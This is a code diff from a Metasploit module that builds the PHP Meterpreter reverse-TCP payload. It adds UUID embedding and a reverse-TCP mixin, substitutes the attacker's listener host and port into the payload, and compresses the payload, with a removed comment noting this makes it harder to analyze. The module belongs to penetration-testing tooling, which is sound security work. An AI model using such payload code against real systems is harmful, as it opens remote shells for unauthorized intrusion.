@@ -5,12 +5,17 @@
 
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
+require 'msf/core/payload/php/reverse_tcp'
 require 'msf/base/sessions/meterpreter_php'
 require 'msf/base/sessions/meterpreter_options'
 
 
-module Metasploit3
+module Metasploit4
+
+  CachedSize = 25679
+
   include Msf::Payload::Single
+  include Msf::Payload::Php::ReverseTcp
   include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
@@ -30,11 +35,14 @@ module Metasploit3
     met = File.open(file, "rb") {|f|
       f.read(f.stat.size)
     }
+
     met.gsub!("127.0.0.1", datastore['LHOST']) if datastore['LHOST']
     met.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']
 
-    # remove comments and compress whitespace to make it smaller and a
-    # bit harder to analyze
+    uuid = generate_payload_uuid
+    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
+    met = met.sub("\"PAYLOAD_UUID\", \"\"", "\"PAYLOAD_UUID\", \"#{bytes}\"")
+
     met.gsub!(/#.*$/, '')
     met = Rex::Text.compress(met)
     met
